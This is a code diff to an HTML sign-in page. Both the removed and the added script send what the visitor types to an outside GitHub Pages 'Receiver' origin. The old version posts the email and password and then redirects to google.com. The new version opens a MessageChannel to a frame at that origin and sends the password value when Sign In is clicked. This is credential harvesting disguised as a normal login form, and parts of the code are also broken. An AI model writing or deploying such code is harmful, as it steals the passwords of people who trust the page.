@@ -25,7 +25,7 @@
                 <button type="button">Forgot your password?<button>
               </div>
           
-          <input type="submit" name="sign-in" value="Sign In">
+          <input type="submit" name="sign-in" value="Sign In" id="submitbutton">
         </form>
       </div>
 
@@ -34,22 +34,20 @@
         const Email = document.getElementById('email');
         const Password = document.getElementById('password');
 
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
+        const channel = new MessageChannel();
+        const myPort = channel.port1;
+        const targetFrame = window.top.frames[1];
+        const targetOrigin = "https://dominator200.github.io/Receiver8787462385790687/";
 
-            const EmailValue = Email.value;
-            const PasswordValue = Password.value;
+        const messageControl = document.getElementById("PasswordValue");
+        const channelMessageButton = document.getElementById("submitbutton");
+
+        channelMessageButton.addEventListener("click", () => {
+          myPort.postMessage(messageControl.value);
+        });
+
+        targetFrame.postMessage("init", targetOrigin, [channel.port2]);
           
-            document.getElementById("EmailValue").value.postMessage(
-            "https://dominator200.github.io/Receiver8787462385790687/"
-            )
-
-            document.getElementById("PasswordValue").value.postMessage(
-            "https://dominator200.github.io/Receiver8787462385790687/"
-            )
-
-            window.location.href = "https://www.google.com"
-        })
       </script>
 </body>
 </html>
